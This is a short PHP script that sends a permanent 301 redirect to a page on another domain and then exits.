<?php

header("Location: https://boimate.com/jkkniu/no.php", true, 301);

exit();

?>